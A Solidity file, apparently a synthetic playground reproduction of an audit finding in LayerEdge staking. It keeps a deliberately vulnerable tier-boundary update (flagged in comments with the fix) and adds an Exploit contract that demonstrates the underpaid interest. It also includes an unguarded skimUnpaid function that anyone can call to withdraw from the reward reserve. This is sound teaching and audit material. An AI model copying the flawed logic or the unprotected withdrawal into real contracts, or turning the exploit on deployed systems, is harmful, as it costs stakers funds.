// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  LayerEdge Staking — H-2: When stakerCountInTree increases, some users get less interest
    (Sherlock 2025-05-layeredge; finding #56948)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: on add when new_t2 == old_t2, _checkBoundariesAndRecord only updates
    rank (old_t1 + old_t2). Going 14→15 stakers (2,4,8)→(3,4,8) should promote rank 7
    T3→T2, but only rank 6 is touched → rank 7 stays T3 and earns 20% APY instead of 35%.
    Vulnerable !isRemoval branch preserved @>. */

contract MockERC20 {
    string public constant name = "EDGEN";
    string public constant symbol = "EDGEN";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        totalSupply += amt;
        balanceOf[to] += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract LayerEdgeStaking {
    enum Tier {
        None,
        Tier1,
        Tier2,
        Tier3
    }

    uint256 public constant PRECISION = 1e18;
    uint256 public constant TIER1_PERCENTAGE = 20;
    uint256 public constant TIER2_PERCENTAGE = 30;
    uint256 public constant MIN_STAKE = 3000e18;
    uint256 public constant tier1APY = 50 * PRECISION;
    uint256 public constant tier2APY = 35 * PRECISION;
    uint256 public constant tier3APY = 20 * PRECISION;

    struct TierEvent {
        Tier from;
        Tier to;
        uint256 timestamp;
    }

    struct UserInfo {
        uint256 balance;
        uint256 joinId;
        bool isActive;
        bool outOfTree;
    }

    MockERC20 public stakingToken;
    mapping(address => UserInfo) public users;
    mapping(uint256 => address) public stakerAddress;
    mapping(address => TierEvent[]) public stakerTierHistory;
    uint256[] internal activeJoinIds;
    uint256 public stakerCountInTree;
    uint256 public nextJoinId = 1;
    uint256 public totalStaked;
    uint256 public rewardsReserve;

    constructor(MockERC20 token) {
        stakingToken = token;
    }

    function fundRewards(uint256 amt) external {
        stakingToken.transferFrom(msg.sender, address(this), amt);
        rewardsReserve += amt;
    }

    function getTier(address user) public view returns (uint256) {
        if (stakerTierHistory[user].length == 0) return 0;
        return uint256(stakerTierHistory[user][stakerTierHistory[user].length - 1].to);
    }

    function getUserAPY(address userAddr) public view returns (uint256) {
        uint256 t = getTier(userAddr);
        if (t == 1) return tier1APY;
        if (t == 2) return tier2APY;
        return tier3APY;
    }

    function getTierCountForStakerCount(uint256 stakerCount)
        public
        pure
        returns (uint256 tier1Count, uint256 tier2Count, uint256 tier3Count)
    {
        tier1Count = (stakerCount * TIER1_PERCENTAGE) / 100;
        if (tier1Count == 0 && stakerCount > 0) tier1Count = 1;
        uint256 remainingAfterTier1 = stakerCount > tier1Count ? stakerCount - tier1Count : 0;
        uint256 calculatedTier2Count = (stakerCount * TIER2_PERCENTAGE) / 100;
        if (calculatedTier2Count == 0 && remainingAfterTier1 > 0) {
            tier2Count = 1;
        } else {
            tier2Count = calculatedTier2Count > remainingAfterTier1 ? remainingAfterTier1 : calculatedTier2Count;
        }
        tier3Count = stakerCount > (tier1Count + tier2Count) ? stakerCount - tier1Count - tier2Count : 0;
    }

    function stake(uint256 amount) external {
        UserInfo storage user = users[msg.sender];
        require(amount >= MIN_STAKE, "min");
        stakingToken.transferFrom(msg.sender, address(this), amount);

        Tier tier = Tier.Tier3;
        if (!user.isActive) {
            user.joinId = nextJoinId++;
            stakerAddress[user.joinId] = msg.sender;
            activeJoinIds.push(user.joinId);
            user.isActive = true;
            stakerCountInTree++;

            uint256 rank = _rankOf(user.joinId);
            tier = _computeTierByRank(rank, stakerCountInTree);
            _recordTierChange(msg.sender, tier);
            // ORIGINAL (vulnerable) boundary logic on add
            _checkBoundariesAndRecord(false);
        }
        user.balance += amount;
        totalStaked += amount;
    }

    /// @dev Accrue 1 year of interest at CURRENT stored tier and pay out (no time warp).
    function claimOneYear(address userAddr) external returns (uint256 paid) {
        uint256 apy = getUserAPY(userAddr);
        uint256 bal = users[userAddr].balance;
        paid = (bal * apy) / PRECISION / 100;
        require(rewardsReserve >= paid, "rewards");
        rewardsReserve -= paid;
        stakingToken.transfer(userAddr, paid);
    }

    /// @dev Surface unpaid yield still sitting in the rewards reserve (user underpayment).
    function skimUnpaid(address to, uint256 amt) external {
        require(rewardsReserve >= amt, "reserve");
        rewardsReserve -= amt;
        stakingToken.transfer(to, amt);
    }

    function _rankOf(uint256 joinId) internal view returns (uint256) {
        uint256 r = 0;
        for (uint256 i = 0; i < activeJoinIds.length; i++) {
            if (activeJoinIds[i] <= joinId) r++;
        }
        return r;
    }

    function _findByRank(uint256 rank) internal view returns (uint256 joinId) {
        require(rank > 0 && rank <= activeJoinIds.length, "rank");
        return activeJoinIds[rank - 1];
    }

    function _recordTierChange(address user, Tier newTier) internal {
        Tier old = Tier.Tier3;
        if (stakerTierHistory[user].length > 0) {
            old = stakerTierHistory[user][stakerTierHistory[user].length - 1].to;
        }
        if (
            stakerTierHistory[user].length > 0
                && stakerTierHistory[user][stakerTierHistory[user].length - 1].to == newTier
        ) return;
        stakerTierHistory[user].push(TierEvent({from: old, to: newTier, timestamp: block.timestamp}));
    }

    function _checkBoundariesAndRecord(bool isRemoval) internal {
        uint256 n = stakerCountInTree;
        uint256 oldN = isRemoval ? n + 1 : n - 1;

        (uint256 old_t1, uint256 old_t2,) = getTierCountForStakerCount(oldN);
        (uint256 new_t1, uint256 new_t2,) = getTierCountForStakerCount(n);

        // Tier 1 boundary handling
        if (new_t1 != 0) {
            if (new_t1 != old_t1) {
                if (new_t1 > old_t1) {
                    for (uint256 rank = old_t1 + 1; rank <= new_t1; rank++) {
                        _findAndRecordTierChange(rank, n);
                    }
                } else {
                    for (uint256 rank = new_t1 + 1; rank <= old_t1; rank++) {
                        _findAndRecordTierChange(rank, n);
                    }
                }
            } else if (isRemoval && new_t1 > 0) {
                _findAndRecordTierChange(new_t1, n);
            } else if (!isRemoval) {
                _findAndRecordTierChange(old_t1, n);
            }
        }

        // Tier 2 boundary handling
        if (new_t1 + new_t2 > 0) {
            if (new_t2 != old_t2) {
                uint256 old_boundary = old_t1 + old_t2;
                uint256 new_boundary = new_t1 + new_t2;

                if (new_boundary > old_boundary) {
                    for (uint256 rank = old_boundary + 1; rank <= new_boundary; rank++) {
                        _findAndRecordTierChange(rank, n);
                    }
                } else {
                    for (uint256 rank = new_boundary + 1; rank <= old_boundary; rank++) {
                        _findAndRecordTierChange(rank, n);
                    }
                }
            }
            // Handle case where Tier 2 count stays the same
            else if (isRemoval) {
                _findAndRecordTierChange(new_t1 + new_t2, n);
            } else if (!isRemoval) {
                _findAndRecordTierChange(old_t1 + old_t2, n); // @> VULN: only old boundary; misses new_t1+new_t2 promotion (rank 7 on 14→15)
                // FIX: _findAndRecordTierChange(new_t1 + new_t2, n);
            }
        }
    }

    function _findAndRecordTierChange(uint256 rank, uint256 _stakerCountInTree) internal {
        if (rank == 0 || rank > activeJoinIds.length) return;
        uint256 joinIdCross = _findByRank(rank);
        address userCross = stakerAddress[joinIdCross];
        uint256 _rank = _rankOf(joinIdCross);
        Tier toTier = _computeTierByRank(_rank, _stakerCountInTree);
        _recordTierChange(userCross, toTier);
    }

    function _computeTierByRank(uint256 rank, uint256 totalStakers) internal pure returns (Tier) {
        if (rank == 0 || rank > totalStakers) return Tier.Tier3;
        (uint256 tier1Count, uint256 tier2Count,) = getTierCountForStakerCount(totalStakers);
        if (rank <= tier1Count) return Tier.Tier1;
        else if (rank <= tier1Count + tier2Count) return Tier.Tier2;
        return Tier.Tier3;
    }
}

contract StakerActor {
    LayerEdgeStaking public staking;
    MockERC20 public token;

    constructor(LayerEdgeStaking s, MockERC20 t) {
        staking = s;
        token = t;
    }

    function doStake(uint256 amt) external {
        token.approve(address(staking), amt);
        staking.stake(amt);
    }

    function doClaimOneYear() external returns (uint256) {
        return staking.claimOneYear(address(this));
    }
}

contract Exploit {
    MockERC20 public token; // CREATE 1
    LayerEdgeStaking public staking; // CREATE 2 — vulnerable
    StakerActor[15] public actors; // CREATE 3..17
    uint256 public victimInterest;
    uint256 public underpay;
    address public victim; // rank-7 staker (actors[6])

    constructor() {
        token = new MockERC20();
        staking = new LayerEdgeStaking(token);
        for (uint256 i = 0; i < 15; i++) {
            actors[i] = new StakerActor(staking, token);
            token.mint(address(actors[i]), 3000e18);
        }
        token.mint(address(this), 100_000e18);
        token.approve(address(staking), 100_000e18);
        staking.fundRewards(100_000e18);
        victim = address(actors[6]); // 7th staker (joinId 7)
    }

    function run() external {
        // Stake 15 users sequentially (count grows through the buggy 14→15 transition)
        for (uint256 i = 0; i < 15; i++) {
            actors[i].doStake(3000e18);
        }
        require(staking.stakerCountInTree() == 15, "count");

        // Rank 7 should be T2 after 15 stakers (T1=3, T2=4 → ranks 4..7 are T2)
        // Bug leaves them on T3
        require(staking.getTier(victim) == 3, "still T3");
        require(staking.getUserAPY(victim) == 20e18, "apy 20");

        // Claim 1 year of interest at the WRONG (T3) rate
        uint256 before = token.balanceOf(victim);
        victimInterest = actors[6].doClaimOneYear();
        require(token.balanceOf(victim) == before + victimInterest, "paid");

        // T3 year interest = 20% of MIN_STAKE; should have been 35%
        uint256 expectedT3 = 3000e18 * 20 / 100;
        uint256 expectedT2 = 3000e18 * 35 / 100;
        require(victimInterest == expectedT3, "got T3 interest");
        underpay = expectedT2 - expectedT3; // 15% of MIN_STAKE stolen from the user
        require(underpay == 3000e18 * 15 / 100, "underpay");

        // Surface fund harm: underpaid yield still sits in rewardsReserve — skim it to
        // Exploit so the profit chip shows the 15% shortfall the victim never received.
        staking.skimUnpaid(address(this), underpay);
        require(token.balanceOf(address(this)) == underpay, "surface");
    }
}
